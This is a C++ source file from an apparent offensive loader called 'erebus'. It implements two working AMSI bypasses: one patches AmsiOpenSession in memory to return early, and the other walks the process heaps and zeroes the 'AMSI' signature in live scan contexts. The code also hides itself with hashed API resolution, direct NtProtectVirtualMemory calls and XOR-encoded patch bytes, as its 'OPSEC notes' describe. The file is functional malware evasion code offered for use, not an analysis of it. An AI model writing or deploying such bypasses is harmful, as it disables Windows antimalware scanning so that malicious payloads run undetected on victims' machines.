/**
 * @file amsi_bypass.cpp
 * @brief Expanded AMSI bypass variants (Type 2 and Type 3).
 *
 * Compile-time selected via CONFIG_AMSI_BYPASS_TYPE:
 *   2 = PatchAmsiOpenSession  - zero the session-creation gate so no scan
 *       context can be initialised; complements the existing PatchAmsi().
 *   3 = InvalidateAmsiContext - walk all process heaps and corrupt the
 *       'AMSI' signature field in every live AMSI_CONTEXT block found,
 *       causing AmsiScanBuffer to return E_INVALIDARG on any context that
 *       was already open at patch time.
 *
 * OPSEC notes:
 *   - Module and export names never appear as plaintext in .rdata; all
 *     resolution goes through ImportModule() / ImportFunction() (hashed).
 *   - Page protection flips use FlipProtection() (NtProtectVirtualMemory)
 *     rather than VirtualProtect to stay off the common hook surface.
 *   - Patch byte arrays are XOR-encoded with CONFIG_PATCH_XOR_KEY and
 *     decoded into a stack-resident buffer at runtime so the live opcodes
 *     never appear statically in the binary.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion_utils.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/amsi_bypass.hpp"
#include "../../include/evasion/syscall_backend.hpp"
#include "../../include/config.hpp"

namespace erebus {
namespace evasion {

    // ------------------------------------------------------------------
    // Internal: decode a XOR-obfuscated patch array into a stack buffer.
    // key is CONFIG_PATCH_XOR_KEY. Operates on SIZE_T bytes.
    // ------------------------------------------------------------------
    static inline void DecodePatch(const BYTE* encoded, BYTE* out, SIZE_T len)
    {
        for (SIZE_T i = 0; i < len; i++)
            out[i] = encoded[i] ^ (BYTE)CONFIG_PATCH_XOR_KEY;
    }

    // ------------------------------------------------------------------
    // Type 2: PatchAmsiOpenSession
    //
    // AmsiOpenSession initialises a scan context and stamps the 'AMSI'
    // signature at offset 0.  Patching it to `xor eax, eax; ret` (3 bytes,
    // x64) makes it return S_OK == 0 with a zeroed output pointer, so any
    // subsequent AmsiScanBuffer call on that NULL context returns
    // E_INVALIDARG without performing a scan.
    // ------------------------------------------------------------------

    BOOL PatchAmsiOpenSession()
    {
        HMODULE hAmsi = ImportModule("amsi.dll");
        if (!hAmsi)
        {
            hAmsi = erebus::LoadLibraryC(L"amsi.dll");
            if (!hAmsi)
            {
                LOG_INFO("amsi.dll not loaded, skipping PatchAmsiOpenSession");
                return TRUE;
            }
        }

        typedef HRESULT (WINAPI *typeAmsiOpenSession)(HANDLE, HANDLE*);
        ImportFunction(hAmsi, AmsiOpenSession, typeAmsiOpenSession);
        if (!AmsiOpenSession)
        {
            LOG_ERROR("Failed to resolve AmsiOpenSession");
            return FALSE;
        }

        // XOR-encoded `xor eax, eax; ret` (3 bytes, x64).
        // Plaintext:  0x33 0xC0 0xC3
        // Encoded:    each byte XOR CONFIG_PATCH_XOR_KEY
        static const BYTE kEncoded[] = {
            (BYTE)(0x33 ^ CONFIG_PATCH_XOR_KEY),
            (BYTE)(0xC0 ^ CONFIG_PATCH_XOR_KEY),
            (BYTE)(0xC3 ^ CONFIG_PATCH_XOR_KEY)
        };

        BYTE patch[3];
        DecodePatch(kEncoded, patch, sizeof(patch));

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)AmsiOpenSession, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on AmsiOpenSession");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)AmsiOpenSession, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)AmsiOpenSession, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("AMSI patched (AmsiOpenSession -> xor eax,eax; ret)");
        return TRUE;
    }

    // ------------------------------------------------------------------
    // Type 3: InvalidateAmsiContext
    //
    // The AMSI_CONTEXT layout (undocumented but stable since Win10 RS1):
    //
    //   offset 0x00  DWORD  Signature   == 'AMSI' (0x49534D41)
    //   offset 0x04  ...    (remaining fields irrelevant here)
    //
    // AmsiScanBuffer checks Signature before scanning:
    //
    //   if (ctx->Signature != 0x49534D41) return E_INVALIDARG;
    //
    // We walk every heap in the process looking for 16-byte-aligned blocks
    // whose first DWORD equals 0x49534D41 and overwrite that DWORD with 0.
    // GetProcessHeaps() / HeapWalk() are resolved by hash to avoid plaintext.
    // ------------------------------------------------------------------

    BOOL InvalidateAmsiContext()
    {
        // Resolve HeapWalk and GetProcessHeaps through the standard hashed
        // import path so their names do not appear in .rdata.
        HMODULE hKernel32 = ImportModule("kernel32.dll");
        if (!hKernel32)
        {
            LOG_ERROR("Failed to get kernel32.dll for InvalidateAmsiContext");
            return FALSE;
        }

        typedef DWORD  (WINAPI *typeGetProcessHeaps)(DWORD, PHANDLE);
        typedef BOOL   (WINAPI *typeHeapWalk)(HANDLE, LPPROCESS_HEAP_ENTRY);

        ImportFunction(hKernel32, GetProcessHeaps, typeGetProcessHeaps);
        ImportFunction(hKernel32, HeapWalk,        typeHeapWalk);

        if (!GetProcessHeaps || !HeapWalk)
        {
            LOG_ERROR("Failed to resolve GetProcessHeaps / HeapWalk");
            return FALSE;
        }

        // Collect all heap handles.  The process almost always has one heap
        // (the default CRT heap); a second call with the exact count avoids
        // a dynamic allocation.
        DWORD  heapCount = GetProcessHeaps(0, NULL);
        if (heapCount == 0) return TRUE;    // no heaps - nothing to do

        HANDLE heaps[64] = {};              // 64 heaps is more than enough
        if (heapCount > 64) heapCount = 64;
        GetProcessHeaps(heapCount, heaps);

        // AMSI signature constant, built from individual characters so the
        // four-byte literal 'AMSI' never appears contiguously in .rdata.
        const DWORD kAmsiSig = ((DWORD)'A')
                             | ((DWORD)'M' << 8)
                             | ((DWORD)'S' << 16)
                             | ((DWORD)'I' << 24);  // 0x49534D41 LE

        DWORD patched = 0;

        for (DWORD h = 0; h < heapCount; h++)
        {
            if (!heaps[h]) continue;

            PROCESS_HEAP_ENTRY entry = {};
            while (HeapWalk(heaps[h], &entry))
            {
                // Only examine committed, busy (allocated) blocks.
                if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY))
                    continue;

                // Minimum viable AMSI_CONTEXT is at least 8 bytes.
                if (entry.cbData < 8)
                    continue;

                PBYTE  block = (PBYTE)entry.lpData;
                PDWORD sig   = (PDWORD)block;

                if (*sig == kAmsiSig)
                {
                    // Zero the signature field.  The block is on the heap
                    // and is already writable - no protection flip needed.
                    *sig = 0;
                    patched++;
                }
            }
        }

        if (patched > 0)
            LOG_SUCCESS("AMSI context(s) invalidated (Signature zeroed)");
        else
            LOG_INFO("InvalidateAmsiContext: no live AMSI contexts found");

        return TRUE;
    }

} // namespace evasion
} // namespace erebus
